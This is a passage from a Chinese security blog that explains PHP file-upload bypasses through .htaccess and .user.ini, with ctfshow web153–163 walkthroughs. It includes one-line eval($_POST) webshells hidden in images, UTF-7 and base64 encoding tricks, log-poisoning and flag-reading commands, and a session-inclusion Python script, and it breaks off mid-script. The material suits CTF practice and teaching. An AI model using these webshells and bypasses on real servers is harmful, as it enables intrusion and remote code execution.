class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_append_file data:<span class="comment">//text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+</span></span><br><span class="line">或:</span><br><span class="line">php_value auto_append_file data:<span class="comment">//text/plain,%3c%3fphp+phpinfo()%3b%3f%3e</span></span><br><span class="line"><span class="comment">// 如果不使用base64加密则注意需要url编码</span></span><br></pre></td></tr></table></figure><p><a href="https://p4.ssl.qhimg.com/t017adc61278406f0b6.png"><img src="https://i0.hdslb.com/bfs/album/8dc281a0d3145f3a88a0f09671b55b5639bc1395.png" alt="img"></a></p><h6 id="通过解析-htaccess-文件"><a href="#通过解析-htaccess-文件" class="headerlink" title="通过解析 .htaccess 文件"></a>通过解析 .htaccess 文件</h6><ul><li>方法一：通过包含 .htaccess 自身</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_append_file .htaccess</span><br><span class="line"><span class="comment">#&lt;?php phpinfo();?&gt;</span></span><br></pre></td></tr></table></figure><p>即让所有的 PHP 文件都包含 .htaccess 文件自身：</p><p><a href="https://p3.ssl.qhimg.com/t0105e8aa38b09e6fbc.png"><img src="https://i0.hdslb.com/bfs/album/232e5dbb19aeb4ee524ad98fcb8322a05aa89463.png" alt="img"></a></p><ul><li>方法二：直接将 .htaccess 文件当做 PHP文件处理</li></ul><p>这种方法适合目标环境当前目录或子目录下没有 PHP 文件的情况下。</p><p>需要先在 .htaccess 里面设置允许访问 .htaccess 文件，否则是直接访问 .htaccess 文件是Forbidden的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;Files ~ <span class="string">&quot;^.ht&quot;</span>&gt;</span><br><span class="line">    Require all granted</span><br><span class="line">    Order allow,deny</span><br><span class="line">    Allow <span class="keyword">from</span> all</span><br><span class="line">&lt;/Files&gt;</span><br></pre></td></tr></table></figure><p>然后再设置将 .htaccess 指定当做 PHP 文件处理并解析：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br><span class="line"><span class="comment"># &lt;?php phpinfo();?&gt;</span></span><br></pre></td></tr></table></figure><p>最终 .htaccess 文件里面的内容为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;Files ~ <span class="string">&quot;^.ht&quot;</span>&gt;</span><br><span class="line">    Require all granted</span><br><span class="line">    Order allow,deny</span><br><span class="line">    Allow <span class="keyword">from</span> all</span><br><span class="line">&lt;/Files&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line"><span class="comment"># &lt;?php phpinfo();?&gt;</span></span><br></pre></td></tr></table></figure><p>然后我们直接访问 .htaccess 文件即可把 .htaccess 文件当做 PHP 文件处理并执行里面的 PHP 代码：</p><p><a href="https://p1.ssl.qhimg.com/t01a7bab4e8077ec879.png"><img src="https://i0.hdslb.com/bfs/album/2ff5f4f657e945fde89835e798abc988fc12288e.png" alt="img"></a></p><h6 id="通过设置-highlight-file"><a href="#通过设置-highlight-file" class="headerlink" title="通过设置 highlight_file"></a>通过设置 highlight_file</h6><p>我们可以通过 .htaccess 文件设定 highlight.comment 选项，指定需要高亮的内容，从而进行 XSS。</p><p>.htaccess中的内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_value highlight.comment <span class="string">&#x27;&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;&#x27;</span></span><br></pre></td></tr></table></figure><p>index.php中的内容为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// comment</span></span><br></pre></td></tr></table></figure><p>当访问index.php时便会触发 XSS：</p><p><a href="https://p0.ssl.qhimg.com/t01a90eb8cc7a6f0548.png"><img src="https://i0.hdslb.com/bfs/album/e0e363a7a3453c0be4569676542ecab0b65141e4.png" alt="img"></a></p><h6 id="通过错误消息链接"><a href="#通过错误消息链接" class="headerlink" title="通过错误消息链接"></a>通过错误消息链接</h6><p>.htaccess 中的内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php_flag display_errors <span class="number">1</span></span><br><span class="line">php_flag html_errors <span class="number">1</span></span><br><span class="line">php_value docref_root <span class="string">&quot;&#x27;&gt;&lt;script&gt;alert(1);&lt;/script&gt;&quot;</span></span><br></pre></td></tr></table></figure><p>index.php 中的内容为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;foo&#x27;</span>); <span class="comment">// 这里会报错</span></span><br></pre></td></tr></table></figure><p>当访问index.php时便会触发 XSS：</p><p><a href="https://p4.ssl.qhimg.com/t01d02403ed5c67d8af.png"><img src="https://i0.hdslb.com/bfs/album/440a1ab64606d0f02aa75036adb2bb03eb2d5e6c.png" alt="img"></a></p><p><strong>include_path</strong></p><p>在题目的代码中有一处 <code>include_once(&quot;fl3g.php&quot;);</code>，但是当我们访问fl3g.php文件时却发现该文件并不存在，这里便用到了php.ini中的include_path选项。</p><p>include_path可以用来设置include()或require()函数包含文件的参考目录路径，也就是说当使用include()或require()函数包含文件的时候，程序首先以include_path设置的路径作为参考点去找文件，如果找不到，则以程序自身所在的路径为参考点去找所要的文件，如果都找不到，则出错，那么我们就可以通过修改它来控制include的路径，那么如果我们能够在其它目录写入同名的fl3g.php让其包含，那么就能够getshell，并且可以使fl3g.php文件不被删除。</p><h6 id="自定义错误文件（可写Webshell）"><a href="#自定义错误文件（可写Webshell）" class="headerlink" title="自定义错误文件（可写Webshell）"></a>自定义错误文件（可写Webshell）</h6><p>error_log 可以将 PHP 运行报错的记录写到指定文件中，因此我们可以通过 .htaccess 文件设定 error_log 选项来自定义错误文件的存储路径，并以此来写入Webshell：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php_value error_log /<span class="keyword">var</span>/www/html/shell.php</span><br><span class="line">php_value include_path <span class="string">&quot;&lt;?php phpinfo(); __halt_compiler();&quot;</span></span><br><span class="line"><span class="comment"># include_path 用来将include()的默认目录路径改变</span></span><br></pre></td></tr></table></figure><p>index.php 中的内容为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;foo&#x27;</span>); <span class="comment">// 这里会报错</span></span><br></pre></td></tr></table></figure><p>访问 index.php，会报错并记录在 shell.php 文件中：</p><p><a href="https://p3.ssl.qhimg.com/t01ecf9347881489efb.png"><img src="https://i0.hdslb.com/bfs/album/ea554b83843efc7b51dce2df19e20ccf5f449f1a.png" alt="img"></a></p><p>如上图可见，成功将我们的phpinfo()写入了shell.php中，但是 <code>&lt;</code> 等字符会经过 html 编码（如上图所示），所以我们需要用 UTF-7 编码格式来绕过。</p><h6 id="Base64-编码绕过"><a href="#Base64-编码绕过" class="headerlink" title="Base64 编码绕过"></a>Base64 编码绕过</h6><p>主要就是利用 auto_append_file 和 PHP 伪协议，比如我们在一个图片中写入经过base64编码后的 Webshell，然后我们便可以使用 auto_append_file 配合 php:&#x2F;&#x2F;filter 将其包含进来：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_append_file <span class="string">&quot;php://filter/convert.base64-decode/resource=images.png&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># images.png 中是经过base64编码后的Webshell</span></span><br></pre></td></tr></table></figure><p>我们直接使用data:&#x2F;&#x2F;协议也是可以的，这样就不需要上传 images.png 了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_append_file data:<span class="comment">//text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+</span></span><br></pre></td></tr></table></figure><p><a href="https://p0.ssl.qhimg.com/t0105e17c142635497a.png"><img src="https://i0.hdslb.com/bfs/album/94f089addce765c14251737ee4caaa555ad1bfb9.png" alt="img"></a></p><h6 id="UTF-7-编码格式绕过"><a href="#UTF-7-编码格式绕过" class="headerlink" title="UTF-7 编码格式绕过"></a>UTF-7 编码格式绕过</h6><p>这种方法我们在前文中已经涉及到了，比如我们在一个图片中写入 UTF-7 编码格式的 Webshell：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// images.png</span></span><br><span class="line">+ADw?php <span class="keyword">eval</span>(+ACQAXw-POST+AFs-whoami+AF0)+ADs?+AD4-</span><br></pre></td></tr></table></figure><p>然后我们使用 auto_append_file 将其包含进来并设置编码格式为 UTF-7 就行了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_append_file images.png</span><br><span class="line">php_flag zend.multibyte <span class="number">1</span></span><br><span class="line">php_value zend.script_encoding <span class="string">&quot;UTF-7&quot;</span></span><br></pre></td></tr></table></figure><p>当然，也可以使用 php:&#x2F;&#x2F;filer 伪协议进行 UTF-7 与 UTF-8 之间的转换，即：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_append_file &quot;php://filter/read=convert.iconv.utf-7.utf-8/resource=images.png&quot;</span><br></pre></td></tr></table></figure><p><a href="https://p3.ssl.qhimg.com/t01b5f7041041ba451b.png"><img src="https://i0.hdslb.com/bfs/album/74928a3013c16d6c49b219170c2a5ae340ed1cd1.png" alt="img"></a></p><p>也可以使用 .htaccess 自身包含来执行 Webshell，这样就不需要再上传一个 images.png 了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_append_file .htaccess</span><br><span class="line">php_flag zend.multibyte <span class="number">1</span></span><br><span class="line">php_value zend.script_encoding <span class="string">&quot;UTF-7&quot;</span></span><br><span class="line"><span class="comment"># +ADw?php eval(+ACQAXw-POST+AFs-whoami+AF0)+ADs?+AD4-</span></span><br></pre></td></tr></table></figure><p>同理，除了使用 UTF-7 外，UTF-16、UTF-32 都可以使用，方法都是一样的。</p><h5 id="与-htaccess-相关的Bypass"><a href="#与-htaccess-相关的Bypass" class="headerlink" title="与.htaccess 相关的Bypass"></a>与.htaccess 相关的Bypass</h5><p>与 .htaccess 相关限制除了使用黑名单限制 .htaccess 外，最常见的就是限制关键字以及加入脏字符啥的了。</p><h6 id="绕过关键字过滤"><a href="#绕过关键字过滤" class="headerlink" title="绕过关键字过滤"></a>绕过关键字过滤</h6><p>绕过对关键字的过滤我们可以使用反斜杠 <code>\</code> 加换行来实现。比如题目过滤了 type、php 等敏感字符，此时为了利用 .htaccess 解析图片马，我们需要将 .htaccess 写成这样：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">AddTy\</span><br><span class="line">pe application/x-httpd-ph\</span><br><span class="line">p .png</span><br><span class="line"><span class="comment"># 即: AddType application/x-httpd-php .png</span></span><br></pre></td></tr></table></figure><h6 id="绕过脏字符"><a href="#绕过脏字符" class="headerlink" title="绕过脏字符"></a>绕过脏字符</h6><p>上面的 [XNUCA2019Qualifier]EasyPHP  这道题目已经涉及到了。即有时候，题目会在我们上传或写入的文件中加入一个混乱的字符（脏字符），由于这些字符不是 .htaccess 文件的语法或指令，所以会使我们的.htaccess文件不生效，出现响应500的问题。为了时我们写入的 .htaccess 文件生效，我们要采用 <code>#</code> 对脏字符进行注释，或使用反斜杠 <code>\</code> 将换行符转义成普通字符。</p><h6 id="绕过对上传图片的尺寸限制"><a href="#绕过对上传图片的尺寸限制" class="headerlink" title="绕过对上传图片的尺寸限制"></a>绕过对上传图片的尺寸限制</h6><p>有时候，在图片上传区会使用 <code>getimagesize()</code> 等函数对上传的图片进行尺寸限制，只允许上传指定大小尺寸的图片，并且会使用 <code>exif_imagetype()</code> 函数读取第一个字节并检查其图片类型。此时如果可以上传 .htaccess 来解析图片的话我们还需要让 .htaccess 的尺寸和经过 <code>exif_imagetype()</code> 检测后的结果符合题目要求。</p><p>我们可以使用 <code>exif_imagetype()</code> 函数支持的 WBMP 图像类型进行绕过。WBMP（Wireless Bitmap）是一种移动计算机设备使用的标准图像格式，是一种纯文本二进制图像格式的图片，实例如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#define test_width 16</span></span><br><span class="line"><span class="comment">#define test_height 7</span></span><br><span class="line"><span class="built_in">static</span> char test_bits[] = &#123;</span><br><span class="line"><span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x15</span>, <span class="number">0x00</span>, <span class="number">0x93</span>, <span class="number">0xcd</span>, <span class="number">0x55</span>, <span class="number">0xa5</span>, <span class="number">0x93</span>, <span class="number">0xc5</span>, <span class="number">0x00</span>, <span class="number">0x80</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x60</span> &#125;;</span><br></pre></td></tr></table></figure><p>可以看到 WBMP 图像的开头可以使用 <code>#</code> 设置图像的尺寸大小，这正符合我们的要求。所以假设题目限制我们上传的图片尺寸必须为1337×1337，那么我们在上传.htaccess时便可以用 WBMP 来绕过，例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#define width 1337</span></span><br><span class="line"><span class="comment">#define height 1337</span></span><br><span class="line">AddType application/x-httpd-php images.png</span><br></pre></td></tr></table></figure><h6 id="文件格式检测"><a href="#文件格式检测" class="headerlink" title="文件格式检测"></a>文件格式检测</h6><p>如果使用exif_imagetype检测上传的文件的第一个字节来判断文件类型，那么只要是图像格式以 # 或 0x00 开头便可绕过<br>（1）使用XBM图像，使用PHP生成图像（需安装GD库）<br>（2）使用WBMP图像，使用PHP生成图像</p><p>（1）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 创建空白图像并添加文字</span><br><span class="line">$im = imagecreatetruecolor(120, 20);</span><br><span class="line">$text_color = imagecolorallocate($im, 233, 14, 91);</span><br><span class="line">imagestring($im, 1, 5, 5,  &#x27;A Simple Text String&#x27;, $text_color);</span><br><span class="line"></span><br><span class="line">// 保存图像</span><br><span class="line">imagexbm($im, &#x27;1.png&#x27;);</span><br><span class="line"></span><br><span class="line">// 释放内存</span><br><span class="line">imagedestroy($im);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>那么可以在.htaccess前面加上：（1_png_width以及1_png_height是根据文件名进行拼接生成的）</p><p>那么可以在.htaccess前面加上：（1_png_width以及1_png_height是根据文件名进行拼接生成的）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#define 1_png_width 120</span><br><span class="line">#define 1_png_height 20</span><br></pre></td></tr></table></figure><p>便可绕过对文件格式的检测</p><p>（2）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$img = imagecreatetruecolor(20, 20);</span><br><span class="line">imagewbmp($img, &#x27;1.wbmp&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h6 id="session"><a href="#session" class="headerlink" title="session"></a>session</h6><p>若过滤了 &lt;、数字、: 等，此时便不能使用php:&#x2F;&#x2F;filter或者UTF编码的方式绕过了；可尝试利用.htaccess设置包含指定的文件；例如对于session文件，可通过包含上传文件产生的临时session进行RCE<br>查看配置文件，发现大部分session相关的配置都是可以通过  .htaccess 修改的<br>那么我们可以在不知道session存储路径的情况下，通过session.save_path指定存储路径，并且可以将session.upload_progress.cleanup 设置为off，这样便可无需条件竞争来将代码写到session文件中，从而包含rce</p><p>.htaccess编写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_append_file &quot;/tmp/sess_gtfly&quot;</span><br><span class="line">php_value session.save_path &quot;/tmp&quot;</span><br><span class="line">php_flag  session.upload_progress.cleanup off</span><br></pre></td></tr></table></figure><p>然后运行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&#x27;http://127.0.0.1/test.php&#x27;</span></span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>:<span class="string">&#x27;PHPSESSID=gtfly&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">files=&#123;</span><br><span class="line">    <span class="string">&quot;upload&quot;</span>:<span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">data=&#123;</span><br><span class="line">    <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: <span class="string">&#x27;&#x27;&#x27;&lt;?php echo system(&#x27;whoami&#x27;); ?&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line">     &#125;</span><br><span class="line">r = requests.session()</span><br><span class="line">r.post(url,files=files,headers=headers,data=data)</span><br><span class="line">t = r.get(<span class="string">&#x27;http://127.0.0.1/test.php&#x27;</span>,headers=headers)</span><br><span class="line"><span class="built_in">print</span>(t.text)</span><br></pre></td></tr></table></figure><p><img src="https://i0.hdslb.com/bfs/album/9c57640fcd8cb2b398700c665629af951c7d9202.png" alt="在这里插入图片描述"></p><p><img src="https://i0.hdslb.com/bfs/album/7e649cdba0c86201df8003b4245ad0ae4bc69692.png" alt="在这里插入图片描述"></p><h4 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h4><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php.ini是php的一个全局配置文件，对整个web服务起作用；而.<span class="keyword">user</span>.ini和.htaccess一样是目录的配置文件，.<span class="keyword">user</span>.ini就是用户自定义的一个php.ini，我们可以利用这个文件来构造后门和隐藏后门。</span><br><span class="line">但是这种方式其实是有个前提的，因为.<span class="keyword">user</span>.ini只对他同一目录下的文件起作用，也就是说，只有他同目录下有php文件才可以。</span><br></pre></td></tr></table></figure><p>配置文件内容：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=filename      <span class="comment">//包含在文件头</span></span><br><span class="line">auto_append_file=filename       <span class="comment">//包含在文件尾</span></span><br><span class="line"><span class="comment">//filename是你自己的文件名</span></span><br></pre></td></tr></table></figure><p>为了利用auto_append_file，我们首先上传.user.ini内容为 auto_append_file&#x3D;”xxx” xxx为我们上传的文件名，接着上传一个带木马的图片<br>因为upload有index.php，所以这个php就会添加一个include”shell.png”，就会包含到木马,这样就在每个php文件上包含了我们的木马文件。</p><p>文件内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.user.ini</span><br><span class="line">内容：  auto_prepend_file=<span class="string">&quot;shell.png&quot;</span></span><br><span class="line">shell.png </span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="ctfshow"><a href="#ctfshow" class="headerlink" title="ctfshow"></a>ctfshow</h4><h5 id="web153"><a href="#web153" class="headerlink" title="web153"></a>web153</h5><p><strong>本题考察利用上传user.ini进行文件上传绕过</strong></p><p>为了利用auto_append_file，我们首先上传一个带木马的图片，接着上传.user.ini内容为 auto_append_file&#x3D;“xxx” xxx为我们上传的文件名。<br>这样就在每个php文件上包含了我们的木马文件。</p><p><img src="https://i0.hdslb.com/bfs/album/c70a0ae59fcfdafcb672a0ebd4e79ffbfa20c3c3.png" alt="在这里插入图片描述"></p><p><img src="https://i0.hdslb.com/bfs/album/0f166f8b89332204e27b77b0db1976fbc18035dc.png" alt="在这里插入图片描述"></p><p>木马上传成功<br>但是这种方式其实是有个前提的，因为.user.ini只对他同一目录下的文件起作用，也就是说，只有他同目录下有php文件才可以。<br>对于这个题，因为他upload目录下有个index.php所以这种方式是可以成功的。</p><p><img src="https://i0.hdslb.com/bfs/album/d9a9d850eccf08cb9ba0b09bac1f19c63455e76e.png" alt="在这里插入图片描述"></p><h5 id="web154-155"><a href="#web154-155" class="headerlink" title="web154 155"></a>web154 155</h5><p>上传正常的图片马失败，经过测试发现是过滤的 &lt;xphp  其中的x是任意字符</p><p>尝试使用短标签绕过<br>对于php的标签其他写法，我们这里多说几种<br>1、</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;? echo &#x27;123&#x27;;?&gt;</span><br></pre></td></tr></table></figure><p>前提是开启配置参数short_open_tags&#x3D;on<br>2、</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=(表达式)?&gt;  等价于 &lt;?php echo (表达式)?&gt;</span><br></pre></td></tr></table></figure><p>不需要开启参数设置</p><p>3、</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% echo &#x27;123&#x27;;%&gt;</span><br></pre></td></tr></table></figure><p>前提是开启配置参数asp_tags&#x3D;on，经过测试发现7.0及以上修改完之后也不能使用，而是报500错误，但是7.0以下版本在修改完配置后就可以使用了。<br>4、</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;php&quot;&gt;echo &#x27;123&#x27;;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>不需要修改参数开关，但是只能在7.0以下可用。<br>对于该题，我们可用使用 <?=(表达式)?> 进行绕过，图片内容 <strong><?=eval($_POST[1]);?></strong><br>剩下的步骤同153</p><h5 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h5><p>在前面的基础上过滤了 <code>[]</code>那我们直接用{}来代替<br>图片马内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=eval($_POST&#123;1&#125;);?&gt;</span><br></pre></td></tr></table></figure><h5 id="web157-158"><a href="#web157-158" class="headerlink" title="web157 158"></a>web157 158</h5><p>过滤了{}和分号，那就直接输出flag算了，不搞一句话了。摊牌了，反正知道flag位置<br>图片马内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=`tac ../f*`?&gt;</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=system(&#x27;tac ../f*&#x27;)?&gt;</span><br></pre></td></tr></table></figure><h5 id="web159"><a href="#web159" class="headerlink" title="web159"></a>web159</h5><p>过滤了括号，那就用反引号就可以啦</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=`tac ../f*`?&gt;</span><br></pre></td></tr></table></figure><h5 id="web160"><a href="#web160" class="headerlink" title="web160"></a>web160</h5><p>这题在之前的基础上过滤了空格</p><p>先说第一种做法</p><p>Nginx日志的默认路径：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/log/nginx/</span><br></pre></td></tr></table></figure><p>先正常上传.user.ini文件（注意里面不要有空格），然后上传图片，图片内容为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">include</span><span class="string">&quot;/var/lo&quot;</span>.<span class="string">&quot;g/nginx/access.lo&quot;</span>.<span class="string">&quot;g&quot;</span><span class="meta">?&gt;</span> (log被过滤)</span><br><span class="line">然后讲一句话写进user-agent里，再蚁剑连接，获取flag</span><br></pre></td></tr></table></figure><p><img src="https://i0.hdslb.com/bfs/album/f3eff571b2339a6d6dc912e5a6e6016e97d7ce5c.png" alt="image-20211023151930256"></p><p>然后连接蚁剑</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url+upload/index.php</span><br></pre></td></tr></table></figure><p>或者将UA改为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;tac ../f*&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后直接访问&#x2F;upload&#x2F;</p><p>第二种</p><p>还是先上传.user.ini，再上传图片，图片内容为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">include</span><span class="string">&quot;ph&quot;</span>.<span class="string">&quot;p://filter/convert.base64-encode/resource=../flag.p&quot;</span>.<span class="string">&quot;hp&quot;</span><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后直接访问&#x2F;upload&#x2F;，进行base64解码就行</p><h5 id="web161"><a href="#web161" class="headerlink" title="web161"></a>web161</h5><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">getimagesize</span>(): 会对目标文件的<span class="number">16</span>进制去进行一个读取，去读取头几个字符串是不是符合图片的要求</span><br></pre></td></tr></table></figure><p>这道题对图片的文件头进行了检测！<br>所以在上题的基础上都加个 <strong>GIF89a</strong> 图片头就可以了<br>.user.ini也得加，图片也得加，上题的两种方法都可以</p><h5 id="web162-163"><a href="#web162-163" class="headerlink" title="web162 163"></a>web162 163</h5><h6 id="session文件包含"><a href="#session文件包含" class="headerlink" title="session文件包含"></a>session文件包含</h6><p>这题把 flag 和 . 给ban了，使用 <strong>seesion文件包含</strong></p><p>首先正常上传.user.ini，内容如下<br><img src="https://i0.hdslb.com/bfs/album/c5e4746b02c42b21715dca00be94b73afc718164.png" alt="在这里插入图片描述"></p><p>接着上传png<br><img src="https://i0.hdslb.com/bfs/album/b4db1c84dba9d3b8af07b5c14e104920e56254b0.png" alt="在这里插入图片描述"><br>最后就开始条件竞争</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">session=requests.session()</span><br><span class="line">url1=<span 